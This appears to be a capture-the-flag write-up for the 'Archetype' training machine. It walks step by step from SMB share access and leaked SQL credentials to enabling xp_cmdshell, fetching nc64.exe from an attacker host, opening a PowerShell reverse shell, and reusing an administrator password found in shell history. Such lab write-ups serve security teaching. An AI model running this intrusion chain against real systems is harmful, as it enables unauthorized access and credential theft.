# Archetype
### Summary
Host running an SMB and a Microsoft SQL server has passwordless access to an SMB share containing a username and password to the SQL server. This SQL user can enable xp_cmdshell and run powershell commands. The powershell history contains a plain-text administrator password.

---

### Scanning

	$ nmap -sV [IP]
	PORT     STATE SERVICE      VERSION 
	135/tcp  open  msrpc        Microsoft Windows RPC
	139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

microsoft-ds: SMB server

### SMB
	$ smbclient -L [IP]
	ADMIN$         Disk      Remote Admin
	backups			Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC

`IPC$` and `backups` are available with blank passwords. \
`backups` contains `prod.dtsConfig` which is a config file for Microsoft SQL.

It contains a username and a password: `Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc`


### MSSQL
The Microsoft SQL server can be accessed with this log-in information. \
Using the [impacket mssql client](https://github.com/fortra/impacket): 

	impacket-mssqlclient -windows-auth ARCHETYPE/sql_svc@[IP]

xp_cmdshell is disabled on the MSSQL server but the error message says it can be enabled by an administrator. 

	SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
shows that we have the sysadmin role and and can enable xp_cmdshell:

	SQL> EXECUTE sp_configure 'show advanced options', 1
	SQL> RECONFIGURE
	SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
	SQL> RECONFIGURE

also powershell commands with: xp_cmdshell "powershell -c [COMMAND]"



### Reverse shell
We can get a reverse shell with with [netcat](https://github.com/int0x33/nc.exe).

nc64.exe can be uploaded with a simple http server on the attacker's machine:

	$ mkdir HTTP; cp nc64.exe HTTP
	$ sudo python3 -m http.server -d HTTP 80
	$ sudo nc -lvv -p 443 

On the target machine:

	SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc; wget -outfile nc64.exe [ATTACKER IP]/nc64.exe"
	SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc; .\nc64.exe -e powershell.exe [ATTACKER IP] 443"


In remote shell:

	PS> cat Desktop/user.txt
	[user flag]


Checking the powershell history:

	PS> cat (Get-PSReadlineOption).HistorySavePath
	net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
	exit

### Logging in with, activating the same reverse shell
Logging in with the administrator password found in powershell history and activating the same reverse shell:

	impacket-psexec administrator@[IP]
	cmd> powershell -c cd C:\Users\sql_svc; ./nc64.exe -e powershell.exe [ATTACKER IP] 433
Root flag:

	PS> cat C:\Users\Administrator\Desktop\root.txt
